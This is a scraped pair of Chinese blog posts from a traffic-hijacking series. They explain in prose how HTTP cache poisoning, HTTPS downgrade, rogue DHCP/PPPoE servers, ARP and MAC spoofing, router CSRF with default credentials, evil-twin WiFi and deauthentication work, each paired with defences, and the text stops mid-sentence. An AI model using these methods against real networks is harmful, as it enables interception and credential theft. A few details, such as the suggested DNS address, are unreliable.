如果只看重眼前利益，这种短暂的入侵并没多少利用价值；但若放远目光，能让攻击在今后发起，那就不再局限于时间和空间了。因此，我们需要一个时光机，让入侵脚本穿越到用户未来的时空运行。 若用传统 XSS 的思维，这几乎无法实现。但在流量劫持面前，一切皆有可能 —— 因为我们能控制任意流量！ HTTP 缓存投毒 上一篇文章提到，但凡有缓存的地方都是大有可为的。显然，对于有着复杂的 HTTP 缓存系统来说，存在缺陷是在所难免了。这种简单的纯文本协议，几乎没有一种签名机制，来验证内容的真实性。即使页面被篡改了，浏览器也完全无法得知，甚至连同注入的脚本也一块缓存起来。 于是，我们可以将『缓存投毒』的概念，引入 HTTP 协议里。但凡具备可执行的资源，都可以通过预加载带毒的版本，将其提前缓存起来。 为了将缓存的有效期发挥到极致，我们事先在各大网站上，找出一些过期时间长、很久没有修改的资源，评估其未来变化不大的可能。 当用户打开任意一个 HTTP 网页时，注入的 XSS 代码开始预加载这些资源。由于一切流量都在控制之中，我们可以完全不走代理，而是返回自己的攻击脚本。 用户浏览器收到回复后，就将其一一缓存起来了。我们可以事先收集大量的资源地址，让用户在线的时间里，尽可能多的缓存受到感染。 未来，用户访问引用了这些资源的网站时，入侵脚本将穿越时空，从沉睡中唤醒。 只要用户不清空缓存，这些被感染的脚本始终附着在浏览器缓存里，直到用户强制刷新页面时或许才能解脱。更多细节可参考这里。 离线储存投毒 不过，有些网站使用的都是很短的缓存，上述的入侵方式似乎就无能为力了。不过，HTML5 时代带来了一项新的缓存技术 —— 离线储存。由于它没有过期时间，因此适用于任意网页的投毒！ 类似的，当用户触发了我们的注入脚本之后，我们创建一个隐形的框架页，加载被感染的网页。同样，通过流量劫持，我们返回一个简单的页面，里面包含一个带有 manifest 属性的 HTML 文档，以及后期运行的脚本。 由于通过隐藏框架访问了这个页面，用户并不知情，但尽职的浏览器却将其缓存起来。 未来，用户打开被感染的网页时，浏览器直接从离线储存里取出，其中布置的脚本因此触发。 由于是个空白页面，因此需要填充上真实的网站内容。最简单的方法，就是嵌套一个原页面的框架，并在 URL 里加上随机数，确保是最新的在线内容。 因为嵌套的是同域框架，最终仍能被入侵脚本所控制。 不过，离线存储投毒的后期影响会小一些。未来用户在安全的网络里打开页面时，虽然能立即显示之前缓存的页面，但同时也会尝试访问 .appcache 文件。由于这个文件大多都不存在，因此浏览器很可能删除掉离线数据，导致之后的访问不再使用离线储存。 因此理论上说只有一次的触发机会，但它没有过期时间，适用于任意 HTTP 页面投毒。 防范措施 在不安全的场合，尽量使用『隐身模式』浏览网页。例如 Chrome 里按 Ctrl+Shift+N 就能调出，可将自己处于隔离的沙盒里。 FireFox 浏览器存储离线文件时，会有用户交互提示，提醒用户是否有这必要。 也许不久后，框架页面不再被离线储存所接受，新标准随时都有可能改变。但 HTTP 缓存投毒是协议栈的缺陷，因此很难防范，下一篇会发现实际入侵效果非常理想。 使用 HTTPS 能否避免劫持？ 如果从密码学的角度来说，使用了 SSL 加密的数据确实难以破解，更不用谈修改了。 然而，惹不起但总躲得起吧。虽然无法破解，但流量仍掌握在自己手中，走哪条路还是由我说的算，完全可以绕过你。 偷换证书 不同于简单的 HTTP 代理，HTTPS 服务需要一个权威机构认定的证书才算有效。自己随便签发的证书，显然是没有说服力的，HTTPS 客户端因此会质疑。 在过去，这并不怎么影响使用过程，无非弹出一个无效的证书之类的提示框。大多用户并不明白是什么情况，就点了继续，导致允许了黑客的伪证书，HTTPS 流量因此遭到劫持。 在经历越来越多的入侵事件之后，人们逐渐意识到，不能再轻易的让用户接受不信任的证书了。如今，主流浏览器对此都会给予严重的警告提示，避免用户进入伪安全站点。 如果重要的账户网站遇到这种情况，无论如何都不该继续，否则大门钥匙或许就落入黑客之手。 因此，这种偷换证书的劫持，在安全意识越来越高的今天，很难再发挥实效了。我们需要一个更隐蔽的方式来躲开加密数据。 过滤 HTTPS 跳转 事实上，在 PC 端上网很少有直接进入 HTTPS 网站的。例如支付宝网站，大多是从淘宝跳转过来，而淘宝使用的仍是不安全的 HTTP 协议。如果在淘宝网的页面里注入 XSS，屏蔽对 HTTPS 的页面访问，用 HTTP 取而代之，那么用户也就永远无法进入安全站点了。 尽管地址栏里没有出现 HTTPS 的字样，但域名看起来也是正确的，大多用户都会认为不是钓鱼网站，因此也就忽视了。 因此，只要入口页是不安全的，那么之后的页面再安全也无济于事。 当然也有一些用户通过输网址访问的，他们输入了 www.alipaly.com 就敲回车进入了。然而，浏览器并不知道这是一个 HTTPS 的站点，于是使用默认的 HTTP 去访问。不过这个 HTTP 版的支付宝的确也存在，其唯一功能就是重定向到自己 HTTPS 站点上。 劫持流量的中间人一旦发现有重定向到 HTTPS 站点的，显然不愿意让用户走这条不受自己控制的路。于是拦下重定向的命令，自己去获取重定向后的站点内容，然后再回复给用户。于是，用户始终都是在 HTTP 站点上访问，自然就可以无限劫持了。 搜索引擎劫持 事实上，HTTPS 站点还有个很大的来源 —— 搜索引擎。遗憾的是，国产搜索引擎几乎都不提供 HTTPS 服务。因此在不安全的网络里，搜索结果是不具备任何权威的。 防范措施 重要的网站必定使用 HTTPS 协议，登陆时需格外留意。 国外的大型网站几乎都提供 HTTPS 服务，甚至是默认的标准。相比国内只有少数重要的服务才使用，绝大多数的信息都是在明文传输。这是为了方便什么来着，你猜。 流量劫持能否控制我电脑？ 如果不考虑一些浏览器安全漏洞，理论上说网页与系统是完全隔离的，因此无需担心系统受到影响。 钓鱼插件 有时为了能让网页获得更多的在线能力，安装插件必不可少，例如支付控件、在线播放器等等。在方便使用的同时，也埋下了安全隐患。 如果是一些小网站强迫用户安装插件的，大家几乎都是置之不理。但若一些正规的大网站，提示用户缺少某些插件，并且配上一些专业的提示，相信大多都会选择安装。而这一切，通过被注入的攻击脚本完全能办到。 不过，正规的插件都是有完整的数字签名的，而伪造的很难躲过浏览器的验证，会出现各种安全提示。因此，攻击者往往使用直接下载的方式，提示用户保存并打开安装包。 页面提权 现在越来越多的应用程序，选择使用内嵌网页来简化界面的开发，在移动设备上更是普遍。 通常为了能让页面和客户端交互，赋予一些本地程序的接口供调用，因此具有了较高的权限。不过，正常情况下嵌入的都是受白名单限制的可信页面，因此不存在安全隐患。 然而在被劫持的网络里，一切明文传输的数据都不再具备可信度。同样的脚本注入，就能获得额外的权限了。 一些带有缺陷的系统，攻击脚本甚至能获得出乎意料的能力。通过之前提到的网页缓存投毒，这颗埋下的地雷随时都有可能触发。 下载程序 即使上网从不安装插件，但是下载程序还是经常需要的。由于大多数的下载网站，使用的都是 HTTP 流量，因此劫持者能轻易的修改可执行文件，将其感染上病毒或木马，甚至完全替换成另一个程序。 用户总认为从官网上下载的肯定没问题，于是就毫无顾虑的打开了。这时，入侵的不再是浏览器环境，而是能控制整个系统了。 防范措施 如果是从浏览器里下载的程序，留意是否具有数字签名，正规的厂商几乎都会提供。如果想试用一些来路不明的小程序，保存到虚拟机里使用就放心多了。 未来 SPDY 技术普及的时候，就再不用担心网页劫持这些事。它将 HTTP 协议封装在加密的流量里传输，想劫持一个普通网页都很困难了。 结尾 暂时就说到这。事实上类似 XSS 的攻击方式还有很多，这里只谈了一些能和流量劫持配合使用的。利用上一篇讲述的各种劫持途径，配合本文提到的入侵方式，可以劫持不少用户了。下一篇，将演示如何利用这些原理，发起实战攻击。 原文:http://www.cnblogs.com/index-html/p/traffic-hijack-2.html 流量劫持系列文章目录: 流量劫持系列1_流量劫持_常见方法_是如何产生的? 流量劫持系列2_流量劫持能有多大危害? 流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包 流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！ 流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 流量劫持系列6_浮层登录框的隐患 流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持 流量劫持系列8_SSLStrip终极版_location瞒天过海 流量劫持系列9_沉默中的狂怒_Cookie 大喷发 流量劫持系列10_躲避HSTS的HTTPS劫持 流量劫持系列11_浅谈网站流量劫持防范措施","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"流量劫持系列1_流量劫持_常见方法_是如何产生的?","slug":"traffic-hijack","date":"2015-04-21T10:53:30.000Z","updated":"2024-09-28T00:17:21.256Z","comments":true,"path":"traffic-hijack.html","permalink":"https://sobaigu.com/traffic-hijack.html","excerpt":"","text":"流量劫持，这种古老的攻击沉寂了一段时间后，最近又开始闹的沸沸扬扬。众多知名品牌的路由器相继爆出存在安全漏洞，引来国内媒体纷纷报道。只要用户没改默认密码，打开一个网页甚至帖子，路由器配置就会被暗中修改。互联网一夜间变得岌岌可危。 攻击还是那几种攻击，报道仍是那千篇一律的砖家提醒，以至于大家都麻木了。早已见惯运营商的各种劫持，频繁的广告弹窗，大家也无可奈何。这么多年也没出现过什么损失，也就睁只眼闭只眼。 事实上，仅仅被运营商劫持算是比较幸运了。相比隐匿在暗中的神秘黑客，运营商作为公众企业还是得守法的，广告劫持虽无节操但还是有底线的。这不，能让你看见广告了，也算是在提醒你，当前网络存在被劫持的风险，得留点神；相反，一切看似风平浪静毫无异常，或许已有一个天大的间谍潜伏在网络里，随时等你上钩 —— 这可不是弹广告那样简单，而是要谋财盗号了！ 我会被劫持吗？ 不少人存在这样的观点：只有那些安全意识薄弱的才会被入侵。只要装了各种专业的防火墙，系统补丁及时更新，所有的密码都很复杂，劫持肯定是轮不到我了。 的确，安全意识强的自然不容易被入侵，但那只对传统的病毒木马而已。而在流量劫持面前，几乎是人人平等的。网络安全与传统的系统安全不同，网络是各种硬件设备组合的整体，木桶效应尤为明显。即使有神一样的系统，但遇到猪一样的设备，你的安全等级瞬间就被拉低了。现在越来越流行便宜的小路由，它们可是承载着各种网上交易的流量，你能放心使用吗？ 即使你相信系统和设备都绝对可靠，就能高枕无忧了吗？事实上有问题的设备并不多，但出问题的事却不少，难道其中还存在什么缺陷？没错，还遗漏了最重要的一点：网络环境。 如果网络环境里有黑客潜伏着，即使有足够专业的技术，是在所难逃了，敌暗我明，稍不留神就会落入圈套。 当然，苍蝇不叮无缝的蛋。有哪些隐患导致你的网络环境出现了裂缝？太多了，从古到今流行过的攻击方式数不胜数。甚至可以根据实际环境，自己创造一种。 现在回忆下尝试过的劫持案例或者常见方法。 上古时代： Hub 嗅探 MAC 欺骗 MAC 冲刷 ARP 攻击 DHCP 钓鱼 DNS 劫持 CDN 入侵 中世纪： 路由器弱口令 路由器 CSRF PPPoE 钓鱼 蜜罐代理 工业时代： WiFi 弱口令 WiFi 伪热点 WiFi 强制断线 WLAN 基站钓鱼 Hub 嗅探 集线器（Hub）这种设备如今早已销声匿迹了，即使在十年前也少有人用。作为早期的网络设备，它唯一的功能就是广播数据包：把一个接口的收到的数据包群发到所有接口上。且不吐槽那小得惊人的带宽，光是这转发规则就是多么的不合理。任何人能收到整个网络环境的数据，隐私安全可想而知。 嗅探器成了那个时代的顶尖利器。只要配置好过滤器，不多久就能捕捉到各种明文数据，用户却没有任何防御对策。 防范措施：还在用的赶紧扔了吧。 这种设备目前唯一可用之处就是旁路嗅探。利用广播的特性，可以非常方便分析其他设备的通信，例如抓取机顶盒的数据包而不影响正常通信。 MAC 欺骗 交换机的出现逐渐淘汰了集线器。交换机会绑定 MAC 地址和接口，数据包最终只发往一个终端。因此只要事先配置好 MAC 对应的接口，理论上非常安全了。 不过，很少有人会那么做，大多为了偷懒，直接使用了设备默认的模式 —— 自动学习。设备根据某个接口发出的包，自动关联该包的源地址到此接口。 然而这种学习并不智能，甚至太过死板，任何一个道听途说都会当作真理。用户发送一个自定义源 MAC 地址的包是非常容易的，因此交换机成了非常容易被忽悠的对象。只要伪造一个源地址，就能将这个地址关联到自己的接口上，以此获得受害者的流量。 不过，受害者接着再发出一个包，绑定关系又恢复原先正常的。因此只要比谁发的频繁，谁就能竞争到这个 MAC 地址的接收权。如果伪造的是网关地址，交换机就误以为网关电缆插到你接口上，网络环境里的出站流量瞬间都到了你这里。 当然，除非你有其他出站渠道，可以将窃取的数据代理出去；否则就别想再转发给被你打垮的真网关了，被劫持的用户也就没法上外网。所以这招危害性不是很大，但破坏性很强，可以瞬间集体断网。 防范措施：机器固定的网络尽量绑定 MAC 和接口吧。貌似大多数网吧都绑定了 MAC 和接口，极大增强了链路层的安全性。同时，独立的子网段尽可能划分 VLAN，避免过大的广播环境。 大学里见过千人以上还不划分 VLAN 的，用一根短路网线就可以毁掉整个网络。 MAC 冲刷 之前说了集线器和交换机的转发区别。如果交换机发现一个暂时还未学习到的 MAC 地址，将会把数据包送往何处呢？为了不丢包，只能是广播到所有接口。 如果能让交换机的学习功能失效，那就退化成一个集线器了。由于交换机的硬件配置有限，显然不可能无限多的记录地址对应条目。我们不停伪造不重复的源地址，交换机里的记录表很快就会填满，甚至覆盖原有的学习记录，用户的数据包无法正常转发，只能广播到所有接口上了。 防范措施：还是 MAC 和接口绑定。一旦绑定，该接口只允许固定的源地址，伪造的自然就失效了。当然，好一点的交换机都有些策略，不会让一个接口关联过多的 MAC 地址。 曾经在家试过一次，捕捉到小区内用户上网的流量。不过伪造包发的太快，~15万包/秒，更致命的是发错目标地址，发到城域网准入服务器上，导致工作人员切断了整个小区半天的网络… 所以必须得选一个 VLAN 内的、并且实际存在的地址做为目标 MAC，以免产生大量的数据风暴。 ARP 攻击 这种攻击大家几乎都听出老茧了，即使不懂电脑的人也知道装个 ARP 防火墙保平安，其危害之大可想而知。 简单的说，ARP 就是广播查询某个 IP 对应的 MAC 地址，在用这个 IP 的人回个声。知道这个 IP 对应的 MAC 地址，就可以链路通信了（链路层只能通过 MAC 地址通信）。 如果有人冒充回复，并抢在正常人之前，伪造的答案也就先入为主。IP 被解析到错误的地址上，之后所有的通信都被劫持了。 事实上，早期的系统还有个更严重的BUG：直接给用户发送一个 ARP 回复包，即使对方从没请求过，系统也会接受这个回复，并提前保存里面的记录。这种基于缓存的投毒，让劫持成功率更上一层楼。 防范措施：由于这种攻击太过泛滥，以至大部分路由器都带了防 ARP 攻击的功能。客户端的 ARP 防火墙也数不胜数，似乎成了安全软件的标配。当然，系统也支持强制绑定 IP 与 MAC 的对应，必要时可以使用。 很多教程都是用 Wireshark 来演示，事实上当年有一款叫 Iris 的软件非常好用，可以修改封包再次发送，用它可以很容易搞明白各种攻击的原理。不过N年没更新了还不支持64位的。 DHCP 钓鱼 现实中，并不是每个人都会配置网络参数，或者出于方便，让网络系统自动配置。出于这个目的，DHCP 服务诞生了。 由于没有配置 IP 地址、网关、DNS 等，在网络上是寸步难行的，因此首先需要从 DHCP 那获得这些。然而，既然连 IP 地址都没有，那又是如何通信的？显然，只能发到广播地址（255.255.255.255）上，而自己则暂时使用无效的IP地址（0.0.0.0）。（事实上，链路层的通信只要有 MAC 地址就行，IP 地址已属于网络层了，但 DHCP 由于某些特殊需要使用的是 UDP 协议） 因为是发往广播，内网环境里的所有用户都能听到。如果存在多个DHCP服务器，则分别予以回复；用户则选择最先收到的。由于规则是如此简单，以至于用户没有选择的余地。 尚若黑客也在内网里也开启了 DHCP 服务，用户收到的回复包很可能就是黑客发出的，这时用户的网络配置完全听天由命了，不想被劫持都难了。 防范措施：如果是用网线上网的话，最好还是手动的配置。当然，管理员应该严格控制 DHCP 回复的权限，只允许交换机特定的接口才有资格发送回复包。 只要是这类提问/抢答模式的，都面临被冒充回答的风险。很多原理都类似。 DNS 劫持 如同 ARP 将 IP 解析成 MAC 地址 一样，DNS 负责将域名解析成 IP 地址。作为网络层的服务，面对的用户更广泛，当然面临的风险也大的多。一旦遭到入侵，所有用户都倒霉了。近些年的重大网络事故无不和 DNS 有关。 DNS 服务一旦被黑客控制，用户发起的各种域名解析，都将被暗中操控。将正常网站解析成黑客服务器的 IP，并事先开启了 HTTP 代理，用户上网时几乎看不出任何破绽；而黑客则获取到所有访问流量，各种网站账号信息都将一览无余。 由于 DNS 服务器的重要性，现实中通常有着较高的安全防护，想入侵它系统不是件易事。但实际未必如此兴师动众，一些 DNS 程序本身就存在着设计缺陷，导致黑客能控制某些域名的指向。其中最恶名昭彰的当属 DNS 缓存投毒。 大家或许已发现，域名-&gt;IP-&gt;MAC-&gt;接口，只要是动态查询的就会多一个环节，风险自然增加。灵活性与安全性始终是不可兼得。 防范措施：手动设置一些权威的 DNS 服务器，例如 8.8.8.8，4.4.4.4 会靠谱的多。 公网上的 DNS 劫持很少发生，但家用路由器的 DNS 劫持已泛滥成灾了。开头报道的路由器漏洞，最终的利用方式也就是修改了 DNS 地址。 CDN 入侵 CDN 能加速大家都知道，但其中原理不少人都不清楚。其实，CDN 本身就是一种 DNS 劫持，只不过是良性的。 不同于黑客强制 DNS 把域名解析到自己的钓鱼 IP 上，CDN 则是让 DNS 主动配合，把域名解析到临近的服务器上。这台服务器同样也开启了 HTTP 代理，让用户感觉不到 CDN 的存在。 不过 CDN 不像黑客那样贪心，劫持用户所有流量，它只『劫持』用户的静态资源访问，对于之前用户访问过的资源，CDN 将直接从本地缓存里反馈给用户，因此速度有了很大的提升。 然而，只要是有缓存的地方，都是大有可为的。一旦 CDN 服务器遭受入侵，硬盘上的缓存文件就岌岌可危了，网页被注入脚本，可执行文件被感染，一大波僵尸即将出现。 防范措施：感觉运营商不靠谱的话，换个第三方不带加速的 DNS，或许就不会解析到 CDN 服务器上了。 不少 CDN 黑白通吃，为了省流量不按套路出牌，超过了缓存时间也不更新，甚至还有忽略 URL 问号后面的，导致程序猿们在资源更新的问题上头疼不已。 路由器弱口令 当电脑价格一再下降，到了大家打算买第二台的时候，路由器市场也随之火热起来。 但由于繁琐的配置，差劲的用户体验，至今仍有相当部分的用户不明白如何配置路由器。192.168.1.1 和 admin/admin 几乎成了国内路由器的常量。多少回，用这毫无技术含量的方法进入网吧或图书馆的路由器后台。 如果有人恶搞重启路由，或者给他人限速，你得感谢他的仁慈，这都算不严重。要是把路由器的 DNS 给改了，那就相当严重了！公网的 DNS 劫持一般不会持续太久，但路由器的 DNS 劫持也许长年累月都不会觉察到。 事实上，不乏一些安全意识强的用户也使用默认密码。理由很简单，目前的路由器有两道门槛：一个 WiFi 连接密码，另一个才是管理密码。很多人设置了复杂的 WiFi 密码就高枕无忧了，心想都连不到我的网络里怎么可能进的了后台？ 之前我也有过这观念，但总觉不对劲：万一家里其他电脑或手机中毒了，自动尝试用弱口令爆进路由器后台怎么办。城门都被占领了，城墙再牢固又有何用。 事实上，黑客除了修改 DNS 配置外，还有更恐怖的行为：升级路由器的固件 —— 替换成一个看似完全相同但植入了恶意程序的固件！尽管这目前还尚未普及，然而一旦流行，大批路由器将成为潘多拉魔盒。 防范措施：千万别轻视路由器的密码，其实它比你所有账号都重要。 不改默认密码的用户，神都保佑不了你~ 路由器 CSRF 回到本文开始所说的，为什么有那么多路由器会出现这个漏洞呢？也许是路由器的开发人员太高估用户了，认为绝大多数用户都修改了默认密码，因此 CSRF 几乎难以产生。 事实上，国内网民的安全意识远超他们的想象。加上刚才说的，只设置了 WiFi 密码而忽略了管理密码，导致一个恶意程序就能悄悄进入路由器后台。 没想到现在这种病毒还真出现了，而且居然还是 Web 版的！ CSRF 漏洞让病毒木马都用不着了。用户直接访问一个网页，甚至是一帖子，浏览器自动向路由器发起修改配置的请求。 由于国产路由器的网页开发是如此的差劲，登录基本都是用既不安全又丑陋的 HTTP 401 弹框。这种登录只需在 URL 里填上『用户名:密码@』即可自动通过，即使登录失败也不会有什么提示。 防范措施：绝对要看管好路由器密码，并且定期去检查配置是否被篡改。 看过路由器页面源代码会发现，那简直是惨不忍睹，甚至还是 IE5 时代的风格。路由器芯片都是采购的，内核也有开源的，所谓的『自主研发』就是做了那几个页面？ PPPoE 钓鱼 好了，不吐槽路由器了，下面说说再高级的路由器也无法避免的事。 除了一些大公司或学校，用的是固定的专线接入上网，个人或者小组织很少会使用这种土豪级套餐，只能老老实实的拨号上网 —— 无论是电信，还是网通铁通各种通。 不少人都存在误区，认为拨号是物理信号的建立过程，在没有拨上之前，点对点是不通的。如果真是这样，那么拨号时账号密码是如何传过去的呢？显然不可能。事实上，终端之间时刻都是畅通的，只不过不拨号就无法得到 IP、网关、会话等参数，即使强制把包发给网关，人家虽能收到，但没有认证的会话是不予理睬的，你自然没法上网。 PPPoE，大家经常在拨号时看到这词。Point-Point Protocol over Ethernet，故名思议，就是点对点的协议：用户发送账号密码认证给终端（BRAS），并得到上网 IP、网关地址、会话等。而且协议是基于以太网的，哪怕线路不是，也得想办法把数据封装进去。 传统的 ADSL 是通过电话线上网的，于是需要一个『猫』来把以太网数据调制成电话信号，最终通过电信交换机传输。这种设备保障每家每户都是独立的，以免电话信号被窃听。 然而，后来兴起的各种通就不一定了。不少打着的『千兆到楼，百兆到家』的宽带，就是建了N个小区局域网，然后合并到一个大的城域网（MAN）里。所谓的『百兆』，无非就是拖进你家的那根网线插在楼下一个 100Mbps 的交换机上而已。 用过网通的都知道，百兆带宽并没有快到哪里，甚至在一些南方地区网速慢如蜗牛。但在下载的时候，却能轻松飙到数兆每秒。这时局域网的作用就发挥出来了，如果附近有多个人在看同样的视频，P2P 就直接在内网里共享流量了，大幅减轻了节点的压力。 但是，整个小区成了一个局域网，是多么的不安全。有时甚至不合理的 VLAN 划分，导致多个小区成一内网。要是有人开启 DHCP 服务，其他用户插上网线就能上网了，连拨号都不用，难道天上掉馅饼了？如果敢吃，那可能就落入黑客的陷阱了。 当然，现在直接插网线的并不多，基本通过路由器自动拨号了。但他们的协议都是一样的 —— PPPoE，一种极不安全的协议。 类似 DHCP 协议，PPPoE 也是通过广播来探寻有哪些可用的终端，意味着整个小区的内网用户都能收到；同时探寻包一直往上冒泡，直到被城域网的终端们收到，然后开始纷纷回应。 如果小区里有人私自开启一个 PPPoE 终端服务，显然是最先被收到的。真正的回应包还在大街小巷里传递着，用户和黑客已经开始协商认证了。 不过或许你会说，这必须有人拨号才能上钩，现在都用路由器，长年累月不会断开。如果不想耐心等，也有很简单的方法：来一次集体掉线。 刚刚说过，可以用短路的网线，引发一场广播风暴。不过这太过暴力了，甚至会引起流量异常的报警。我们可以使用更简单有效的方法：MAC 欺骗，不停伪造终端服务器的 MAC 地址，就可以将小区用户的数据包统统吸过来了。 PPPoE 使用的是一种隧道方式，将任何数据都封装在其栈下，因此捕捉到用户任意一个包，即可得到 PPPoE 栈上的会话 ID。然后冒充终端，向用户发送一个『断开连接』的指令，用户就乖乖下线了。使用这种方法，分分钟就能让整个小区的用户重新拨一次号，于是可以快速钓鱼了。 还有更糟的是，PPPoE 绝大多数时候都是明文传输用户名和密码的，因此还能额外获得用户发来的认证账号。 前面吐槽了大学寝室楼 1000 多机器还不划 VLAN 的，于是写一个简单的 PPPoE 模拟器，就能轻松抓到整个网络环境里的上网账号。（还支持一键全都拨上，集体下线的恶作剧功能~） 防范措施：由于 PPPoE 的安全严重依赖物理层，所以尽量不要装以太网接入的宽带。当然，管理员们应该严格限制 PPPoE 搜寻回复包，就像 DHCP 那样只允许特定接口出现。事实上小区内部是不可能出现 BRAS 服务器的，因此只允许交换机的 WAN 口出现回复包，那样就不容易被钓鱼了。 PPPoE 还有个更严重 BUG，会话 ID 只有 2 字节，最多 65536 种可能。事先构造个『拨号断开』的请求包，接着把会话 ID 依次遍历一下，就能让某个终端服务器的所有用户下线。如果事先收集好所有终端服务器地址，可以发起一次全城断网- - 这个 BUG 应该早已经修复了，只需绑定 &lt;会话 ID，用户 MAC，小区 VLAN-ID&gt; 关系即可。而且一个小脚本就能断开全城各县市的网络，说明终端部署不能太过集中。 蜜罐代理 由于众所周知的原因，某国对代理的需求居高不下。不管黑的白的，透明的还是高匿的，只要能翻出去就是好的。 VPN 需要用户名密码以及各种认证，中途被劫持几乎是不可能的。黑客抓住了人们的纯真的心里，将目光转到代理上面。的确，加密后的数据中途确实难以劫持，但最终仍要在服务端还原出真实内容吧。如果一时大意，连接了某个免费的 VPN，或许就登上了黑客的贼船了。 相比 HTTP 代理只影响部分功能，VPN 将整个系统的流量都穿越过去了。而这一切应用程序并不知晓，仍然将一些重要的数据往外发送，最终被黑客所劫持。 防范措施：不要贪图小利，用那些打着免费幌子的代理。天下没有免费的午餐。 很多蜜罐代理未必是黑客布下的，而是你懂的。 WiFi 弱口令 当互联网延伸到移动设备时，网线成了最大的累赘，无线网络逐渐进入人们视野。如今，由于无线的廉价和便利，几乎应用到所有的便捷设备。一切都不再受限制，人们可以随时随地上网，这是过去难以想象的；黑客也可以随时随地发起攻击，这是过去梦寐以求的。 但无论上网方式如何变化，以太网始终是网络的核心。如同刚才说的 ADSL，尽管载体是电话线路，但最终解调出来的仍是以太网数据。WiFi 也一样，无论电波怎样传播，最终只有还原出标准的以太网封包才能被路由。 无线网络形同一个看不见的巨大集线器，无需任何物理传播介质，附近所有人都可以收听数据信号，专业设备甚至能在更远处捕获。如果没有一种强有力的加密方式把数据封装起来，那么就毫无隐私可言了。 在经历了各种加密被攻破后，WPA2 如今成为无线网络标准加密算法。如果企图通过传统爆后台那样，一次次的尝试弱口令去连接，那效率将是何其的低下。 和拨号不同，WiFi 用户首先需『关联』热点，以建立起物理通道。类似 PPPoE 那样，WiFi 在认证之前也是可以通信的，并且是明文数据 —— 不过，这仅仅是认证数据包明文而已，真正密码显然不会出现在其中。毕竟它和拨号的目的完全不同：一个是为了加密之后所有的流量，而后者仅仅识别下你有没有上网的权限。 通过传统的嗅探工具，可以方便获取这些握手通信包。尽管找不出密码，但里面保存着密钥初始化相关的数据。通过专业的 WPA2 破解工具，加上丰富的密码字典，有相当一部分的无线网络，能在可接受的时间里被破解。 对于不少人来说，无线密码是他第一道也是唯一一道防线。连上之后，不出意外即可轻易进入路由器后台，然后就可以控制他整个内网的流量了。 防范措施：最简单也是最有效的方法：给密码加些特殊符号。 如果给他的路由器刷一个固件，能自动破解其他的无线网络，破解之后自动进后台，自动给它升级自己的固件。。。排山倒海的路由器木马爆发了。 WiFi 热点钓鱼 上面简单的说了无线密码的破解。但若本来就知道密码的情况下，又如何发起入侵呢？ 这种场合很常见，在一些商场、餐厅、旅馆等地方，无线网络即使有密码，大家一般也能在墙上或卡片上找到，处于半公开的状态。或者是破解了邻居的无线密码，但无法进入路由器后台，又该如何继续？ 如今越来越智能的无线设备，已能很好的防御诸如 MAC 欺骗以及 ARP 攻击这类原始入侵了，因此需要一个更先进和隐蔽的方式，能绕过网络设备，直接发起点对点的进攻。 在大公司或大商场上过无线网的用户会发现，在室内无论走到哪里网络都存在，即使从一层到五层信号照样满格，而在自己家中信号隔墙就下降不少。难道是开了信号特别强大的热点吗？但在建筑外面却收不到。事实上，不难发现每层楼天花板上，都吸附着不少盘子似的东西。没错，正是这些分布在各处的设备，覆盖了整栋楼的无线网络，让信号死角变得更少。 但是同时存在那么多热点，搜索列表里显示的却没有几个。因为他们都有着同样的热点名（SSID），客户端通常会将同名热点合并成一个。至于连接时，系统会选择信号最好的那个。如果这些热点的认证方式也是相同的，无论连哪个都没问题。 仔细揣摩这条特征，不难发现其中大有文章可做 —— 这不天生就为我们钓鱼准备的！我们再开一个同名同认证的伪热点，只要在信号上压倒对方，钓上附近的鱼儿那是妥妥的。 目前几乎还没有哪个客户端对此有防御，无论是商场还是咖啡店，甚至是一些大公司里，对此也束手无策。原因很简单，问题既不出在设备、也不是部署上，更不能归咎与用户。这是整个协议栈的弱点。 发起此攻击的唯一材料，就是一个超大功率的热点，以此来压倒正常的，争做用户『最信赖』的信号源。 其实，每个热点都时时刻刻广播着一种叫 Beacon 的数据包，里面带有热点名等相关的信息。用户网卡收集之后进过筛选分析，即可得知附近有哪些热点，各自信号如何。功率大的热点，用户接收时的信号强度（RSSI）自然也会高一些。 当然，过高的信号源可能会引起一些监控的警觉，自己也被置于巨大的辐射之中。如果仅仅是对某个方位片杀，使用定向天线会有更好的效果。 不过，光有发射能力还是不够的。即使能把 Beacon 推送到数十公里外，让全城都能看见你的热点名，但前来连接的设备可没有那么强劲信号。因此没有一个高灵敏的接收系统，再强的信号也只是一厢情愿罢了。 防范措施：因为是底层的缺陷，这种劫持通常很难防护。从理论上说，热点通常是固定着的，因此可以事先记录下每个热点的3D坐标，然后根据 WiFi 定位时刻监控热点位置，如果某个热点信号出现在远离事先的地方，很可能是钓鱼热点发出的假信号。 但在现实中，要同时追踪那么多设备并不容易。除非所有的无线设备，都自带监控附近热点的功能，那样可以节省大量追踪成本。 不过在安全性高的场合，还是使用『接入认证』，连接时要求输入用户名和密码来准入。 用户成功连上 WiFi 后，导致网络状态发生改变，一些系统会尝试请求某个特定的 URL，如果返回的是 HTTP 302，会自动弹出重定向后的网页。目的是为了方便打开网页版的准入，有时连上 CMCC 会自动弹出一个登录网页就是如此。iPhone，iPad，MacOS，WP 都支持。利用这个废功能来弹广告应该很不错~ WiFi 强制断线 不得不说 WiFi 的另一个缺陷 —— 被下线。类似 PPPoE 主动或被动断开拨号时都有一个注销包，WiFi 也一样。 之前提到，遍历 PPPoE 的会话ID，冒充所有用户发出注销请求，可以断开全城的网络。WiFi 也有类似的缺陷，只不过正好反过来：冒充热点，向所有用户广播注销包，于是所有连着该热点的用户都下线了。 不过，WiFi 的被下线仅仅是认证被注销，用户和热点仍是关联着的。用户接着重新发起认证，因此又给黑客一个获取握手数据的机会。 如果广播持续不断，用户也就一直没法上网，屏幕上会不停的闪烁着『连接中… / 已断开』。对方可能会尝试重启路由，但发现问题仍在，而且所有设备都是这情况，会认为路由器出问题了，于是尝试恢复出厂设置 —— 这一刻，危险降临了！ 照国产路由器的风格，出厂时 WiFi 